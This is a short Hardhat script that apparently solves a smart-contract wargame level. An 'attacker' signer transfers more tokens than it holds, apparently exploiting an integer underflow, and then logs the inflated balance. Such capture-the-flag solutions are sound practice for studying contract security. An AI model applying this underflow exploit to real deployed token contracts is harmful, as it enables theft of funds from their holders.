import { fail } from "assert";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

const SUB_AMOUNT = "21";

async function tokenExploit() {
  const tokenAddress = process.env.TOKEN_ADDRESS || fail("TOKEN_ADDRESS Not Found In .env");
  const [attacker, toAddress] = await ethers.getSigners();
  const token = await ethers.getContractAt("Token", tokenAddress);
  const tx = await token.connect(attacker).transfer(toAddress.address, SUB_AMOUNT);

  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);

  await tx.wait(1);

  console.log("Balance after hack : ", (await token.balanceOf(attacker.address)).toString());
  console.log(`SUCCESS!!! Submit the instance.`);
}

tokenExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
